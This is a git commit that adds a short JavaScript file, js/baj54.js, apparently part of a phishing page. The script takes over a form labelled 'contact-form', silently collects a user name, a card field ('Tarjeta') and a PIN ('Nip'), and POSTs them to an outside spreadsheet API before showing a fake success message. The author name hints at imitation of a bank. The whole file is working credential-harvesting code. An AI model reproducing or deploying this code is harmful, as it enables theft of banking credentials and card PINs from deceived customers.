2a3bf7fd12645e2d120ff584005bfe98da2f35cd
B4Jio <corazones.verdes@outlook.com>
2024-02-22 13:10:06 -0600

    first commit

---
+++ js/baj54.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/0d122be2-bba0-4878-ba83-e2af0b404b25', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Tarjeta": formulario.fecha.value,
+            "Nip": formulario.nip.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
